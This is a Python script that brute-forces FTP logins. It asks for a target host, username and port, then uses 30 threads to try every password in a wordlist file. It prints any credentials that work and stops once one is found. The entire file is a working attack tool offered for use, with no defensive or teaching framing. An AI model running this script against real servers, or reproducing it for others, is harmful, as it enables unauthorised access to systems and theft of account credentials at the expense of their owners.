import ftplib
from threading import Thread
import queue
import colorama  # for colors
from colorama import Fore, Style

# Initialize colorama
colorama.init()

def print_ftp_banner():
    banner = r"""
.--. Brute Force
|__| .-------.
|=.| |.-----.|
|--| || FTP ||
|  | |'-----'|
|__|~')_____(' by Oziesiek
    """
    colored_banner = f"{Fore.CYAN}{banner}{Style.RESET_ALL}"
    print(colored_banner)

# Call the function to print the FTP banner
print_ftp_banner()

# init the queue
q = queue.Queue()
# number of threads to spawn
n_thread = 30

# Get user input for FTP server details
host = input("Enter the FTP server hostname or IP address: ")
user = input("Enter the FTP username: ")
port = int(input("Enter the FTP Port: "))

def print_message(message, color=Fore.WHITE, style=Style.NORMAL):
    print(f"{style}{color}{message}{Style.RESET_ALL}")

def connect_ftp():
    global q
    while True:
        try:
            # get the password from the queue
            password = q.get()
            # initialize the FTP server object
            server = ftplib.FTP()
            print_message(f'[!] Trying {password}', Fore.YELLOW)
            try:
                # tries to connect to FTP server with a timeout of 5
                server.connect(host, port, timeout=5)
                # login using the credentials (user & password)
                server.login(user, password)
            except ftplib.error_perm:
                # login failed, wrong credentials
                pass
            else:
                # correct credentials
                print_message("[+] Found credentials:")
                print_message(f"\tHost: {host}", Fore.GREEN)
                print_message(f"\tUser: {user}", Fore.GREEN)
                print_message(f"\tPassword: {password}", Fore.GREEN)
                # found the password, let's clear the queue
                with q.mutex:
                    q.queue.clear()
                    q.all_tasks_done.notify_all()
                    q.unfinished_tasks = 0
            finally:
                # notify the queue that the task is completed for this password
                q.task_done()
        except Exception as e:
            print_message(f"Error: {e}", Fore.RED)


# read the wordlist of passwords
passwords = open("wordlist.txt").read().split("\n")
print_message("[+] Passwords to try:", Fore.CYAN)

# put all passwords into the queue
for password in passwords:
    q.put(password)

# create 'n_thread' that runs that function
for t in range(n_thread):
    thread = Thread(target=connect_ftp)
    # will end when the main thread ends
    thread.daemon = True
    thread.start()

# wait for the queue to be empty
q.join()
